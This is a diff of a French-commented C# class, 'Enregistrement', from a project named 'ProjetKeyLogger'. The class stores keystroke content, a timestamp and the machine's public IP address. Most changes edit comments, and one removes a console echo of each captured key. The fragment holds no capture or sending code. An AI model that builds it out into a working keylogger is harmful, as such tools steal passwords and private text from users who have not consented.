@@ -6,9 +6,11 @@ namespace ProjetKeyLogger
     [Serializable]
     public class Enregistrement
     {
-        //Contenu de l'enregistrement courrant
+        //Contenu de l'enregistrement
         private String contenu = "";
+        //Date de l'enregistrement
         private DateTime date;
+        //Adresse de l'enregistrement
         private String adresse_ip_publique; 
 
         //proprieté en lecture / ecriture
@@ -50,14 +52,14 @@ namespace ProjetKeyLogger
             }
         }
 
-        //Renvoie la date et l'heure courrante
+        //Renvoi la date et l'heure a un moment donné
         public void dateTimeNow()
         {
             //Date actuelle
             date =  DateTime.Now;
         }
 
-        //Renvoie l'adresse IP publique
+        //Renvoi l'adresse IP publique de la machine a un moment donné
         public void adresseIpPublique()
         {
             //Retourne l'adresse IP publique
@@ -67,8 +69,7 @@ namespace ProjetKeyLogger
         //Fonction qui concatene la derniere touche tapé au clavier, au contenu de l'enregistrement
         public void ajouterContenu(string caractere)
         {
-            Console.WriteLine(caractere);
-            //Ajout du caracter au contenu du text
+            //Ajout du caractere au contenu du text
             contenu += caractere;
         }
 
